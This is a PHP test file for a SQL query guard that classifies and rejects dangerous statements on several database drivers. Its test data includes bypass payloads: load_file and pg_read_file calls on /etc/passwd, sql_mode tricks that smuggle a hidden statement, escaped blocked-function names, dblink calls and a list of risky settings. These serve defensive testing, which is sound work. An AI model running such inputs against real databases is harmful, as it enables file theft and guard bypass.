
test('EXPLAIN ANALYZE spellings all run the inner statement', function (string $sql) {
    expect(inspect($sql, DbDriver::Pgsql)->type())->toBe(StatementType::Write);
})->with([
    'legacy with VERBOSE' => 'EXPLAIN ANALYZE VERBOSE UPDATE t SET a=1 WHERE id=1',
    'British spelling' => 'EXPLAIN ANALYSE UPDATE t SET a=1 WHERE id=1',
    'option list, true' => 'EXPLAIN (ANALYZE true, BUFFERS) UPDATE t SET a=1 WHERE id=1',
    'option list, on' => 'EXPLAIN (FORMAT JSON, ANALYZE on) UPDATE t SET a=1 WHERE id=1',
    'option list, 1' => 'EXPLAIN (ANALYZE 1) UPDATE t SET a=1 WHERE id=1',
    'lower case' => 'explain (analyze) update t set a=1 where id=1',
    'mysql' => 'EXPLAIN ANALYZE UPDATE t SET a=1 WHERE id=1',
]);

test('an EXPLAIN option block that cannot be read is rejected', function (string $sql) {
    expect(inspect($sql, DbDriver::Pgsql)->passes())->toBeFalse();
})->with([
    'unclosed option list' => 'EXPLAIN (ANALYZE',
    'unclosed with a statement' => 'EXPLAIN (ANALYZE SELECT 1',
    'ANALYZE value that is not a boolean' => 'EXPLAIN (ANALYZE maybe) SELECT 1',
    'empty option' => 'EXPLAIN (ANALYZE,, BUFFERS) SELECT 1',
    'ANALYZE without a statement' => 'EXPLAIN ANALYZE',
]);

test('EXPLAIN ANALYZE carries the inner denylist and limit without touching the option block', function () {
    $forbidden = inspect('EXPLAIN ANALYZE DROP DATABASE prod', DbDriver::Pgsql);
    $select = inspect('EXPLAIN (ANALYZE, BUFFERS) SELECT * FROM t', DbDriver::Pgsql);

    expect($forbidden->passes())->toBeFalse()
        ->and($select->type())->toBe(StatementType::Read)
        ->and($select->preparedSql())->toStartWith('EXPLAIN (ANALYZE, BUFFERS) SELECT * FROM t')
        ->and($select->preparedSql())->toContain('LIMIT');
});

test('EXPLAIN ANALYZE nested past the depth limit is rejected', function () {
    expect(inspect('EXPLAIN ANALYZE EXPLAIN ANALYZE SELECT 1', DbDriver::Pgsql)->passes())->toBeTrue()
        ->and(inspect('EXPLAIN ANALYZE EXPLAIN ANALYZE EXPLAIN ANALYZE EXPLAIN ANALYZE SELECT 1', DbDriver::Pgsql)->passes())->toBeFalse();
});

test('MariaDB ANALYZE is judged by the statement it executes', function (string $sql, bool $passes, StatementType $type) {
    $result = inspect($sql, DbDriver::Mariadb);

    expect($result->passes())->toBe($passes)
        ->and($result->type())->toBe($type);
})->with([
    'select' => ['ANALYZE SELECT 1', true, StatementType::Read],
    'update with WHERE' => ['ANALYZE UPDATE t SET a=1 WHERE id=1', true, StatementType::Write],
    'delete with WHERE' => ['ANALYZE DELETE FROM t WHERE id=1', true, StatementType::Write],
    'insert' => ['ANALYZE INSERT INTO t VALUES (1)', true, StatementType::Write],
    'replace' => ['ANALYZE REPLACE INTO t VALUES (1)', true, StatementType::Write],
    'CTE select' => ['ANALYZE WITH x AS (SELECT 1) SELECT * FROM x', true, StatementType::Read],
    'parenthesised select' => ['ANALYZE (SELECT 1)', true, StatementType::Read],
    'FORMAT=JSON select' => ['ANALYZE FORMAT=JSON SELECT 1', true, StatementType::Read],
    'lower case FORMAT = json' => ['analyze format = json update t set a=1 where id=1', true, StatementType::Write],
    'delete without WHERE' => ['ANALYZE DELETE FROM t', false, StatementType::Write],
    'update without WHERE' => ['ANALYZE UPDATE t SET a=1', false, StatementType::Write],
    'FORMAT=JSON delete without WHERE' => ['ANALYZE FORMAT=JSON DELETE FROM t', false, StatementType::Write],
    'comment as separator' => ['ANALYZE/**/DELETE FROM t', false, StatementType::Write],
    'DDL' => ['ANALYZE DROP TABLE t', false, StatementType::Write],
    'TRUNCATE' => ['ANALYZE TRUNCATE t', false, StatementType::Write],
    'SET' => ['ANALYZE SET GLOBAL general_log = 1', false, StatementType::Write],
    'ANALYZE of ANALYZE' => ['ANALYZE ANALYZE DELETE FROM t WHERE id=1', false, StatementType::Write],
    'FORMAT before something that is not a statement' => ['ANALYZE FORMAT=JSON t', false, StatementType::Write],
    'FORMAT without =' => ['ANALYZE FORMAT JSON SELECT 1', false, StatementType::Write],
    'FORMAT without a statement' => ['ANALYZE FORMAT=JSON', false, StatementType::Write],
    'wrapped in parentheses' => ['(ANALYZE DELETE FROM t WHERE id=1)', false, StatementType::Write],
]);

test('MariaDB ANALYZE carries the inner denylist and limit without touching its prefix', function () {
    $forbidden = inspect("ANALYZE SELECT load_file('/etc/passwd')", DbDriver::Mariadb);
    $select = inspect('ANALYZE FORMAT=JSON SELECT * FROM t', DbDriver::Mariadb);

    expect($forbidden->passes())->toBeFalse()
        ->and($select->type())->toBe(StatementType::Read)
        ->and($select->preparedSql())->toStartWith('ANALYZE FORMAT=JSON SELECT * FROM t')
        ->and($select->preparedSql())->toContain('LIMIT');
});

test('MariaDB ANALYZE counts towards the nesting depth limit', function () {
    expect(inspect("EXECUTE IMMEDIATE 'EXECUTE IMMEDIATE ''ANALYZE SELECT 1'''", DbDriver::Mariadb)->passes())->toBeTrue()
        ->and(inspect("EXECUTE IMMEDIATE 'EXECUTE IMMEDIATE ''EXECUTE IMMEDIATE ''''ANALYZE SELECT 1'''''''", DbDriver::Mariadb)->passes())->toBeFalse();
});

test('ANALYZE and EXPLAIN ANALYZE cut the inner statement at its byte offset behind multibyte comments', function (string $sql, DbDriver $driver) {
    $result = inspect($sql, $driver);

    expect($result->passes())->toBeFalse()
        ->and($result->type())->toBe(StatementType::Write)
        ->and($result->violations)->toContain('Statement 1: DELETE without a WHERE clause is not allowed.');
})->with([
    'MariaDB ANALYZE' => ['ANALYZE /* '.str_repeat('é', 23).' */ DELETE FROM t', DbDriver::Mariadb],
    'MariaDB ANALYZE with a short comment' => ['ANALYZE /* éé */ DELETE FROM t', DbDriver::Mariadb],
    'MariaDB ANALYZE FORMAT=JSON' => ['ANALYZE FORMAT=JSON /* ééééé */ DELETE FROM t', DbDriver::Mariadb],
    'MariaDB EXPLAIN ANALYZE' => ['EXPLAIN ANALYZE /* '.str_repeat('é', 23).' */ DELETE FROM t', DbDriver::Mariadb],
    'PostgreSQL EXPLAIN ANALYZE' => ['EXPLAIN ANALYZE /* '.str_repeat('é', 23).' */ DELETE FROM t', DbDriver::Pgsql],
]);

test('ANALYZE behind a multibyte comment keeps its prefix whole', function () {
    $result = inspect('ANALYZE /* ğüş */ SELECT * FROM t', DbDriver::Mariadb);

    expect($result->passes())->toBeTrue()
        ->and($result->type())->toBe(StatementType::Read)
        ->and($result->preparedSql())->toStartWith('ANALYZE /* ğüş */ SELECT * FROM t')
        ->and($result->preparedSql())->toContain('LIMIT')
        ->and(mb_check_encoding($result->preparedSql(), 'UTF-8'))->toBeTrue();
});

test('ANALYZE of a statement is read fail-closed on the mysql and unknown drivers', function (?DbDriver $driver) {
    expect(inspect('ANALYZE DELETE FROM t', $driver)->passes())->toBeFalse()
        ->and(inspect('ANALYZE FORMAT=JSON DELETE FROM t', $driver)->passes())->toBeFalse()
        ->and(inspect('ANALYZE DROP TABLE t', $driver)->passes())->toBeFalse()
        ->and(inspect('ANALYZE UPDATE t SET a=1 WHERE id=1', $driver)->type())->toBe(StatementType::Write);
})->with([
    'mysql' => [DbDriver::Mysql],
    'unknown' => [null],
]);

test('ANALYZE TABLE and the maintenance spellings keep their classification', function (string $sql, ?DbDriver $driver) {
    $result = inspect($sql, $driver);

    expect($result->passes())->toBeTrue()
        ->and($result->type())->toBe(StatementType::Write)
        ->and($result->preparedSql())->toBe($sql);
})->with([
    'mysql ANALYZE TABLE' => ['ANALYZE TABLE t', DbDriver::Mysql],
    'mysql NO_WRITE_TO_BINLOG' => ['ANALYZE NO_WRITE_TO_BINLOG TABLE t', DbDriver::Mysql],
    'mysql LOCAL' => ['ANALYZE LOCAL TABLE t', DbDriver::Mysql],
    'mysql histogram' => ['ANALYZE TABLE t UPDATE HISTOGRAM ON a', DbDriver::Mysql],
    'mariadb ANALYZE TABLE' => ['ANALYZE TABLE t', DbDriver::Mariadb],
    'unknown driver ANALYZE TABLE' => ['ANALYZE TABLE t', null],
    'pgsql bare' => ['ANALYZE', DbDriver::Pgsql],
    'pgsql table' => ['ANALYZE VERBOSE t', DbDriver::Pgsql],
    'pgsql option list' => ['ANALYZE (VERBOSE) t', DbDriver::Pgsql],
    'unknown driver table name' => ['ANALYZE t', null],
    'sqlite table' => ['ANALYZE main.t', DbDriver::Sqlite],
]);

test('ANALYZE before a statement keeps its classification where ANALYZE never runs one', function (DbDriver $driver) {
    $result = inspect('ANALYZE SELECT 1', $driver);

    expect($result->type())->toBe(StatementType::Write)
        ->and($result->preparedSql())->toBe('ANALYZE SELECT 1');
})->with([
    'pgsql' => [DbDriver::Pgsql],
    'sqlite' => [DbDriver::Sqlite],
]);

test('SELECT INTO a table is a DDL write without a limit', function (DbDriver $driver) {
    $result = inspect('SELECT * INTO t2 FROM t', $driver);

    expect($result->type())->toBe(StatementType::Write)
        ->and($result->hasDdl())->toBeTrue()
        ->and($result->preparedSql())->toBe('SELECT * INTO t2 FROM t');
})->with([
    'pgsql' => DbDriver::Pgsql,
    'sqlsrv' => DbDriver::Sqlsrv,
]);

test('SELECT INTO a temporary table is a DDL write', function () {
    $result = inspect('SELECT * INTO TEMP t2 FROM t', DbDriver::Pgsql);

    expect($result->type())->toBe(StatementType::Write)
        ->and($result->hasDdl())->toBeTrue();
});

test('SELECT INTO a MySQL user variable stays a read', function () {
    $result = inspect('SELECT a INTO @x FROM t LIMIT 1', DbDriver::Mysql);

    expect($result->passes())->toBeTrue()
        ->and($result->type())->toBe(StatementType::Read)
        ->and($result->hasDdl())->toBeFalse();
});

test('INTO inside a subquery or a literal does not make a SELECT a write', function (string $sql) {
    expect(inspect($sql, DbDriver::Pgsql)->type())->toBe(StatementType::Read);
})->with([
    "SELECT 'INTO t2' FROM t",
    'SELECT * FROM t -- INTO t2',
]);

test('server control and remote channel functions are rejected', function (string $sql) {
    expect(inspect($sql, DbDriver::Pgsql)->passes())->toBeFalse();
})->with([
    'terminate backend' => 'SELECT pg_terminate_backend(123)',
    'cancel backend' => 'SELECT pg_cancel_backend(pid) FROM pg_stat_activity',
    'reload conf' => 'SELECT pg_reload_conf()',
    'promote' => 'SELECT pg_promote()',
    'dblink' => "SELECT * FROM dblink('host=x', 'SELECT 1') AS t(a int)",
    'dblink exec' => "SELECT dblink_exec('host=x', 'DROP TABLE t')",
    'upper case' => 'SELECT PG_TERMINATE_BACKEND(1)',
    'double-quoted name' => 'SELECT "pg_terminate_backend"(1)',
    'space before the parenthesis' => 'SELECT pg_reload_conf ()',
    'schema-qualified' => 'SELECT pg_catalog.pg_terminate_backend(1)',
]);

test('set_config is judged like SET', function (string $sql, bool $passes) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes())->toBe($passes)
        ->and($result->type())->toBe(StatementType::Write);
})->with([
    'dangerous literal name' => ["SELECT set_config('LOCAL_INFILE', 'on', false)", false],
    'harmless literal name' => ["SELECT set_config('application_name', 'x', false)", true],
    'name from a column' => ['SELECT set_config(name, setting, false) FROM pg_settings', false],
    'concatenated name' => ["SELECT set_config('local_' || 'infile', 'on', false)", false],
]);

dataset('pg dangerous settings', [
    'session_preload_libraries',
    'local_preload_libraries',
    'dynamic_library_path',
    'default_transaction_read_only',
    'transaction_read_only',
    'session_replication_role',
    'allow_system_table_mods',
    'lo_compat_privileges',
    'zero_damaged_pages',
    'ignore_checksum_failure',
]);

test('set_config rejects every PostgreSQL setting that loads code or lifts a protection', function (string $name) {
    foreach ([
        "SELECT set_config('{$name}', 'x', false)",
        "SELECT set_config('{$name}', 'x', true)",
        'SELECT set_config(\''.strtoupper($name)."', 'x', false)",
    ] as $sql) {
        $result = inspect($sql, DbDriver::Pgsql);

        expect($result->passes())->toBeFalse()
            ->and($result->violations[0])->toContain($name);
    }
})->with('pg dangerous settings');

test('SET rejects a listed setting in every scope on PostgreSQL and on an unknown driver', function (string $name) {
    foreach ([DbDriver::Pgsql, null] as $driver) {
        foreach ([
            "SET {$name} = 'x'",
            "SET {$name} TO 'x'",
            "SET LOCAL {$name} = 'x'",
            "SET SESSION {$name} = 'x'",
            'SET "'.$name."\" = 'x'",
            'SET/**/SESSION '.strtoupper($name)." TO 'x'",
        ] as $sql) {
            $result = inspect($sql, $driver);

            expect($result->passes())->toBeFalse("{$sql} passed on ".($driver->value ?? 'an unknown driver'))
                ->and($result->violations[0])->toContain($name);
        }
    }
})->with('pg dangerous settings');

test('MySQL and MariaDB still guard only the persistent SET scopes', function (DbDriver $driver) {
    expect(inspect('SET SESSION general_log = 1', $driver)->passes())->toBeTrue()
        ->and(inspect('SET general_log = 1', $driver)->passes())->toBeTrue()
        ->and(inspect('SET @@SESSION.general_log = 1', $driver)->passes())->toBeTrue()
        ->and(inspect('SET GLOBAL general_log = 1', $driver)->passes())->toBeFalse()
        ->and(inspect('SET GLOBAL session_replication_role = 1', $driver)->passes())->toBeFalse();
})->with([
    'mysql' => DbDriver::Mysql,
    'mariadb' => DbDriver::Mariadb,
]);

dataset('sql_mode writes', [
    'plain SET' => "SET sql_mode = 'NO_BACKSLASH_ESCAPES'",
    'SET SESSION' => "SET SESSION sql_mode = 'NO_BACKSLASH_ESCAPES'",
    'SET GLOBAL' => "SET GLOBAL sql_mode = 'ANSI_QUOTES'",
    'SET LOCAL' => "SET LOCAL sql_mode = 'NO_BACKSLASH_ESCAPES'",
    'SET PERSIST' => "SET PERSIST sql_mode = 'ANSI_QUOTES'",
    '@@ session spelling' => "SET @@sql_mode = 'NO_BACKSLASH_ESCAPES'",
    '@@ session spelling with loose spacing' => "SET @@ sql_mode = 'NO_BACKSLASH_ESCAPES'",
    '@@SESSION. spelling' => "SET @@SESSION.sql_mode = 'NO_BACKSLASH_ESCAPES'",
    '@@GLOBAL. spelling' => "SET @@GLOBAL.sql_mode = 'ANSI_QUOTES'",
    '@@LOCAL. spelling' => "SET @@local.sql_mode = 'ANSI_QUOTES'",
    'upper case and :=' => "SET SQL_MODE := 'NO_BACKSLASH_ESCAPES'",
    'backtick-quoted name' => "SET `sql_mode` = 'NO_BACKSLASH_ESCAPES'",
    'behind a harmless first assignment' => "SET time_zone = '+00:00', sql_mode = 'NO_BACKSLASH_ESCAPES'",
    'scope inside a MySQL executable comment' => "SET /*!40101 SESSION sql_mode */ = 'NO_BACKSLASH_ESCAPES'",
    'assignment inside a MySQL executable comment' => "SET /*!40101 sql_mode = 'NO_BACKSLASH_ESCAPES' */",
    '@@ spelling inside a MySQL executable comment' => "SET /*!50000 @@SESSION.sql_mode = 'ANSI_QUOTES' */",
    'MariaDB SET STATEMENT ... FOR' => "SET STATEMENT sql_mode = 'NO_BACKSLASH_ESCAPES' FOR SELECT 1",
    'second assignment of SET STATEMENT' => "SET STATEMENT max_statement_time = 5, sql_mode = 'ANSI_QUOTES' FOR SELECT 1",
    'ahead of the statement it would hide' => "SET SESSION sql_mode = 'NO_BACKSLASH_ESCAPES'; SELECT 'a\\', load_file('/etc/passwd') -- '",
    'SET as the statement of SET STATEMENT ... FOR' => "SET STATEMENT max_statement_time = 1 FOR SET sql_mode = 'NO_BACKSLASH_ESCAPES'",
    'SET in a nested SET STATEMENT ... FOR' => "SET STATEMENT max_statement_time = 1 FOR SET STATEMENT lock_wait_timeout = 1 FOR SET SESSION sql_mode = 'ANSI_QUOTES'",
    'SET STATEMENT ... FOR SET ahead of the statement it would hide' => "BEGIN; SET STATEMENT max_statement_time = 1 FOR SET sql_mode = 'NO_BACKSLASH_ESCAPES'; UPDATE t SET a = 'x\\', b = load_file('/etc/passwd') -- ' WHERE id = 1; COMMIT;",
]);

test('a write to sql_mode is refused in every scope on MySQL and MariaDB', function (string $sql, DbDriver $driver) {
    $result = inspect($sql, $driver);

    expect($result->passes())->toBeFalse()
        ->and(implode("\n", $result->violations))->toContain('sql_mode')
        ->and(implode("\n", $result->violations))->toContain('quotes and backslashes');
})->with('sql_mode writes')->with([
    'mysql' => DbDriver::Mysql,
    'mariadb' => DbDriver::Mariadb,
]);

test('a write to sql_mode is refused on every other driver as well', function (?DbDriver $driver) {
    expect(inspect("SET SESSION sql_mode = 'NO_BACKSLASH_ESCAPES'", $driver)->passes())->toBeFalse()
        ->and(inspect("SET @@sql_mode = 'ANSI_QUOTES'", $driver)->passes())->toBeFalse();
})->with([
    'pgsql' => DbDriver::Pgsql,
    'sqlsrv' => DbDriver::Sqlsrv,
    'sqlite' => DbDriver::Sqlite,
    'unknown driver' => null,
]);

test('a MariaDB executable comment carrying a sql_mode write is refused on MariaDB', function () {
    expect(inspect("SET /*M! sql_mode = 'NO_BACKSLASH_ESCAPES' */", DbDriver::Mariadb)->passes())->toBeFalse();
});

test('the statement after SET STATEMENT ... FOR is held to the rules of a top-level statement', function (string $sql, string $violation, ?DbDriver $driver) {
    $result = inspect($sql, $driver);

    expect($result->passes())->toBeFalse()
        ->and(implode("\n", $result->violations))->toContain($violation);
})->with([
    'a persistent dangerous SET' => ['SET STATEMENT max_statement_time = 1 FOR SET GLOBAL general_log = 1', 'general_log'],
    'a DELETE without WHERE' => ['SET STATEMENT max_statement_time = 1 FOR DELETE FROM t', 'DELETE without a WHERE clause'],
    'an UPDATE with an always-true WHERE' => ['SET STATEMENT max_statement_time = 1 FOR UPDATE t SET a = 1 WHERE 1 = 1', 'always-true WHERE'],
    'a nested SET STATEMENT' => ['SET STATEMENT max_statement_time = 1 FOR SET STATEMENT lock_wait_timeout = 1 FOR DELETE FROM t', 'DELETE without a WHERE clause'],
    'a parenthesised FOR in the value' => ['SET STATEMENT max_statement_time = (SELECT 1 FROM dual FOR UPDATE) FOR DELETE FROM t', 'DELETE without a WHERE clause'],
    'nesting past the bound' => ['SET STATEMENT a = 1 FOR SET STATEMENT b = 1 FOR SET STATEMENT c = 1 FOR SET STATEMENT d = 1 FOR SELECT 1', 'nested more than'],
    'no FOR at all' => ['SET STATEMENT max_statement_time = 1', 'SET STATEMENT without'],
    'FOR with no statement after it' => ['SET STATEMENT max_statement_time = 1 FOR', 'SET STATEMENT without'],
])->with([
    'mysql' => DbDriver::Mysql,
    'mariadb' => DbDriver::Mariadb,
    'unknown driver' => null,
]);

test('a SET STATEMENT carrying a dollar-quoted string is refused', function (string $sql, ?DbDriver $driver) {
    expect(inspect($sql, $driver)->passes())->toBeFalse();
})->with([
    'ahead of a DELETE without WHERE' => 'SET STATEMENT x = $$ab$$ FOR DELETE FROM t',
    'before FOR' => 'SET STATEMENT x = $$ab$$ FOR DELETE FROM t WHERE id = 1',
    'hiding a comment before FOR' => 'SET STATEMENT x = $$ SELECT 1 -- $$ FOR DELETE FROM t WHERE id = 1',
    'tagged, before FOR' => 'SET STATEMENT x = $tag$long text$tag$ FOR SELECT 1',
])->with([
    'pgsql' => DbDriver::Pgsql,
    'unknown driver' => null,
]);

test('the statement after SET STATEMENT ... FOR keeps its own type and LIMIT', function () {
    $read = inspect('SET STATEMENT max_statement_time = 5 FOR SELECT * FROM users', DbDriver::Mariadb);
    $write = inspect('SET STATEMENT max_statement_time = 5 FOR UPDATE users SET a = 1 WHERE id = 1', DbDriver::Mariadb);

    expect($read->violations)->toBe([])
        ->and($read->type())->toBe(StatementType::Read)
        ->and($read->statements[0]->limitInjected)->toBeTrue()
        ->and($read->preparedSql())->toBe("SET STATEMENT max_statement_time = 5 FOR SELECT * FROM users\nLIMIT 1000")
        ->and($write->violations)->toBe([])
        ->and($write->type())->toBe(StatementType::Write)
        ->and($write->preparedSql())->toBe('SET STATEMENT max_statement_time = 5 FOR UPDATE users SET a = 1 WHERE id = 1');
});

test('set_config on sql_mode is refused with the lexer-mode reason', function () {
    $result = inspect("SELECT set_config('sql_mode', 'x', false)", DbDriver::Pgsql);

    expect($result->passes())->toBeFalse()
        ->and(implode("\n", $result->violations))->toContain('quotes and backslashes')
        ->and(implode("\n", $result->violations))->not->toContain('server-side file paths');
});

test('reading sql_mode and setting other session variables still pass', function (string $sql, DbDriver $driver) {
    expect(inspect($sql, $driver)->violations)->toBe([]);
})->with([
    'SELECT @@sql_mode' => 'SELECT @@sql_mode',
    'SELECT @@SESSION.sql_mode' => 'SELECT @@SESSION.sql_mode',
    'SELECT @@GLOBAL.sql_mode' => 'SELECT @@GLOBAL.sql_mode',
    'SHOW VARIABLES' => "SHOW VARIABLES LIKE 'sql_mode'",
    'SET @@ session spelling of another variable' => "SET @@time_zone = '+00:00'",
    'SET STATEMENT with another variable' => 'SET STATEMENT max_statement_time = 5 FOR SELECT 1',
    'a user variable named sql_mode' => "SET @sql_mode = 'ANSI_QUOTES'",
])->with([
    'mysql' => DbDriver::Mysql,
    'mariadb' => DbDriver::Mariadb,
]);

test('a user variable is not mistaken for a server setting', function () {
    expect(inspect('SET @general_log = 1')->passes())->toBeTrue();
});

test('harmless PostgreSQL settings still pass', function (string $sql) {
    expect(inspect($sql, DbDriver::Pgsql)->passes())->toBeTrue();
})->with([
    'SET work_mem' => "SET work_mem = '64MB'",
    'SET LOCAL work_mem' => "SET LOCAL work_mem = '64MB'",
    'SET SESSION search_path' => 'SET SESSION search_path = public',
    'set_config application_name' => "SELECT set_config('application_name', 'report', false)",
    'set_config search_path' => "SELECT set_config('search_path', 'public', true)",
    'set_config statement_timeout' => "SELECT set_config('statement_timeout', '0', false)",
]);

test('state-changing functions make a SELECT a write', function (string $sql) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes())->toBeTrue()
        ->and($result->type())->toBe(StatementType::Write)
        ->and($result->preparedSql())->toBe($sql);
})->with([
    'nextval' => "SELECT nextval('seq')",
    'setval' => "SELECT setval('seq', 10)",
    'advisory lock' => 'SELECT pg_advisory_lock(1)',
    'advisory lock, shared variant' => 'SELECT pg_advisory_lock_shared(1)',
    'transaction advisory lock' => 'SELECT pg_advisory_xact_lock(1)',
    'mysql named lock' => "SELECT GET_LOCK('x', 10)",
    'mysql named lock release' => "SELECT RELEASE_LOCK('x')",
]);

test('resource-consuming functions make a SELECT a write', function (string $sql) {
    $result = inspect($sql);

    expect($result->passes())->toBeTrue()
        ->and($result->type())->toBe(StatementType::Write);
})->with([
    'pg_sleep' => 'SELECT pg_sleep(10)',
    'pg_sleep_for' => "SELECT pg_sleep_for('5 minutes')",
    'mysql sleep' => 'SELECT SLEEP(10)',
    'mysql backtick sleep' => 'SELECT `sleep`(10)',
    'mysql benchmark' => "SELECT BENCHMARK(1000000, MD5('x'))",
]);

test('a function name that is not called does not trigger a rule', function (string $sql) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes())->toBeTrue()
        ->and($result->type())->toBe(StatementType::Read);
})->with([
    'inside a string literal' => "SELECT 'pg_sleep(1)'",
    'inside a line comment' => 'SELECT 1 -- dblink(',
    'inside a block comment' => 'SELECT 1 /* pg_terminate_backend(1) */',
    'inside a dollar-quoted body' => 'SELECT $$pg_terminate_backend(1)$$',
    'inside a tagged dollar-quoted body' => 'SELECT $q$ nextval(1) $q$',
    'as a column name' => 'SELECT sleep FROM t',
    'as a longer function name' => 'SELECT my_pg_sleep(1)',
]);

test('configured function lists extend the built-in lists', function () {
    config([
        'queryproxy.blocked_functions' => ['lo_unlink'],
        'queryproxy.state_changing_functions' => ['audit_touch'],
        'queryproxy.resource_consuming_functions' => [],
    ]);

    expect(inspect('SELECT lo_unlink(1)')->passes())->toBeFalse()
        ->and(inspect('SELECT audit_touch(1)')->type())->toBe(StatementType::Write)
        ->and(inspect('SELECT pg_sleep(1)')->type())->toBe(StatementType::Write)
        ->and(inspect('SELECT pg_terminate_backend(1)')->passes())->toBeFalse();
});

test('EXPLAIN ANALYZE is recognised however it is spaced', function (string $sql, bool $passes) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->type())->toBe(StatementType::Write)
        ->and($result->passes())->toBe($passes);
})->with([
    'no space after EXPLAIN' => ['EXPLAIN(ANALYZE) DELETE FROM t', false],
    'no space anywhere' => ['EXPLAIN(ANALYZE)DELETE FROM t', false],
    'two options, no space' => ['EXPLAIN(ANALYZE,BUFFERS)UPDATE t SET a=1 WHERE id=1', true],
    'two options' => ['EXPLAIN(ANALYZE, BUFFERS) UPDATE t SET a=1 WHERE id=1', true],
    'comment as separator' => ['EXPLAIN/**/ANALYZE/**/DELETE FROM t', false],
]);

test('an EXPLAIN option the guard does not know is rejected', function (string $sql) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes())->toBeFalse()
        ->and($result->type())->toBe(StatementType::Write);
})->with([
    'quoted ANALYZE' => 'EXPLAIN ("analyze") DELETE FROM t WHERE id=1',
    'quoted ANALYZE with a value' => 'EXPLAIN ("analyze" true) DELETE FROM t WHERE id=1',
    'U& escaped ANALYZE' => 'EXPLAIN (U&"\0061nalyze") DELETE FROM t WHERE id=1',
    'backticked ANALYZE' => 'EXPLAIN (`analyze`) DELETE FROM t WHERE id=1',
    'unknown option' => 'EXPLAIN (FROBNICATE) DELETE FROM t WHERE id=1',
    'option with an expression value' => 'EXPLAIN (COSTS (true)) DELETE FROM t WHERE id=1',
    'ANALYZE yes, not a defGetBoolean value' => 'EXPLAIN (ANALYZE yes) DELETE FROM t WHERE id=1',
    'ANALYZE with an escaped string value' => "EXPLAIN (ANALYZE E'o\\ff') DELETE FROM t WHERE id=1",
    'wrapped in parentheses' => '(EXPLAIN ANALYZE DELETE FROM t WHERE id=1)',
]);

test('EXPLAIN boolean values follow PostgreSQL', function (string $sql, StatementType $type) {
    expect(inspect($sql, DbDriver::Pgsql)->type())->toBe($type);
})->with([
    'quoted true' => ["EXPLAIN (ANALYZE 'true') UPDATE t SET a=1 WHERE id=1", StatementType::Write],
    'upper-case ON' => ['EXPLAIN (ANALYZE ON) UPDATE t SET a=1 WHERE id=1', StatementType::Write],
    'zero' => ['EXPLAIN (ANALYZE 0) UPDATE t SET a=1 WHERE id=1', StatementType::Read],
    'quoted off' => ["EXPLAIN (ANALYZE 'off') UPDATE t SET a=1 WHERE id=1", StatementType::Read],
]);

test('EXPLAIN of a parenthesised statement is read as the statement', function () {
    $result = inspect('EXPLAIN (SELECT * FROM t)', DbDriver::Pgsql);

    expect($result->passes())->toBeTrue()
        ->and($result->type())->toBe(StatementType::Read);
});

test('SELECT INTO a table is caught however it is spaced or wrapped', function (string $sql) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->type())->toBe(StatementType::Write)
        ->and($result->hasDdl())->toBeTrue()
        ->and($result->preparedSql())->toBe($sql);
})->with([
    'no space around the star' => 'SELECT*INTO t2 FROM t',
    'comment as separator' => 'SELECT/**/*/**/INTO/**/t2/**/FROM t',
    'wrapped in parentheses' => '(SELECT * INTO t2 FROM t)',
    'wrapped and unioned' => '(SELECT * INTO t2 FROM t) UNION SELECT * FROM t3',
    'inside a CTE body' => 'WITH x AS (SELECT * FROM t) SELECT * INTO t2 FROM x',
    'quoted target' => 'SELECT * INTO "t2" FROM t',
]);

test('INSERT INTO inside a CTE body is a write but not a SELECT INTO', function () {
    $result = inspect('WITH x AS (INSERT INTO t (a) VALUES (1) RETURNING a) SELECT * FROM x', DbDriver::Pgsql);

    expect($result->type())->toBe(StatementType::Write)
        ->and($result->hasDdl())->toBeFalse();
});

test('a blocked function hidden in U& escapes is rejected', function (string $sql) {
    expect(inspect($sql, DbDriver::Pgsql)->passes())->toBeFalse();
})->with([
    'escaped blocked function' => 'SELECT U&"pg\005fterminate\005fbackend"(123)',
    'custom UESCAPE' => "SELECT U&\"pg!005fterminate!005fbackend\" UESCAPE '!'(123)",
    'schema-qualified' => 'SELECT pg_catalog.U&"pg\005fcancel\005fbackend"(1)',
    'escaped file IO function' => 'SELECT U&"pg\005fread\005ffile"(\'/etc/passwd\')',
]);

test('a resource function hidden in U& escapes makes the statement a write', function (string $sql) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes())->toBeTrue()
        ->and($result->type())->toBe(StatementType::Write);
})->with([
    'four-digit escape' => 'SELECT U&"pg\005fsleep"(10)',
    'six-digit escape' => 'SELECT U&"pg\+00005fsleep"(10)',
    'lower-case u' => 'SELECT u&"pg\005fsleep"(10)',
]);

test('a called U& name the guard cannot decode is rejected', function (string $sql) {
    expect(inspect($sql, DbDriver::Pgsql)->passes())->toBeFalse();
})->with([
    'truncated escape' => 'SELECT U&"pg\005"(1)',
    'surrogate code point' => 'SELECT U&"\D800x"(1)',
    'invalid UESCAPE character' => "SELECT U&\"pg+005fsleep\" UESCAPE '+'(1)",
]);

test('a quoted function name is read from its raw spelling', function (string $sql) {
    expect(inspect($sql, DbDriver::Pgsql)->passes())->toBeFalse();
})->with([
    'double-quoted' => 'SELECT "pg_terminate_backend"(1)',
    'double-quoted file IO' => 'SELECT "pg_read_file"(\'/etc/passwd\')',
    'backticked file IO' => 'SELECT `load_file`(\'/etc/passwd\')',
]);

test('every dblink function is blocked', function (string $function) {
    expect(inspect("SELECT {$function}('conn', 'SELECT 1')", DbDriver::Pgsql)->passes())->toBeFalse();
})->with(['dblink_connect_u', 'dblink_open', 'dblink_fetch', 'dblink_get_result']);

test('a PostgreSQL EXPLAIN without ANALYZE does not judge the calls it only plans', function () {
    $sleep = inspect('EXPLAIN SELECT pg_sleep(10)', DbDriver::Pgsql);
    $terminate = inspect('EXPLAIN SELECT pg_terminate_backend(1)', DbDriver::Pgsql);
    $analyzed = inspect('EXPLAIN ANALYZE SELECT pg_terminate_backend(1)', DbDriver::Pgsql);

    expect($sleep->passes())->toBeTrue()
        ->and($sleep->type())->toBe(StatementType::Read)
        ->and($terminate->passes())->toBeTrue()
        ->and($terminate->type())->toBe(StatementType::Read)
        ->and($analyzed->passes())->toBeFalse();
});

test('a MySQL or unknown-driver EXPLAIN still judges its calls', function (?DbDriver $driver) {
